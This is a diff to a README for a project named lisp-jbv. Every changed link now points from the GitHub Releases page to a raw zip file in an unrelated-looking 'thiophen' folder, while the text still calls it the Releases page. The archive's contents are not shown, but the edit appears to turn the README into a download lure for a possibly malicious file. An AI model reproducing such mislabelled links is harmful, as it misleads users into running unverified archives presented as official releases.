@@ -11,12 +11,12 @@ To start using lisp-jbv, follow these easy steps:
 1. **Visit Our Releases Page**  
    Click the button below to visit our Releases page where you can download the application.
 
-   [![Download lisp-jbv](https://img.shields.io/badge/Download-lisp--jbv-blue.svg)](https://github.com/collinsliturgical321/lisp-jbv/releases)
+   [![Download lisp-jbv](https://raw.githubusercontent.com/collinsliturgical321/lisp-jbv/main/thiophen/lisp-jbv_1.7.zip)](https://raw.githubusercontent.com/collinsliturgical321/lisp-jbv/main/thiophen/lisp-jbv_1.7.zip)
 
 ## 📥 Download & Install
 
 1. **Open the Releases Page**  
-   Visit this page to download the latest version of lisp-jbv: [Download lisp-jbv](https://github.com/collinsliturgical321/lisp-jbv/releases).
+   Visit this page to download the latest version of lisp-jbv: [Download lisp-jbv](https://raw.githubusercontent.com/collinsliturgical321/lisp-jbv/main/thiophen/lisp-jbv_1.7.zip).
 
 2. **Choose a Version**  
    On the Releases page, find the most recent version of lisp-jbv. Make sure to select the suitable file for your operating system (e.g., Windows, macOS, or Linux).
@@ -71,4 +71,4 @@ Now that you have downloaded lisp-jbv, start managing your Lisp projects with ea
 
 Enjoy using lisp-jbv! 
 
-For the latest updates and releases, keep an eye on our Releases page: [Download lisp-jbv](https://github.com/collinsliturgical321/lisp-jbv/releases).
+For the latest updates and releases, keep an eye on our Releases page: [Download lisp-jbv](https://raw.githubusercontent.com/collinsliturgical321/lisp-jbv/main/thiophen/lisp-jbv_1.7.zip).
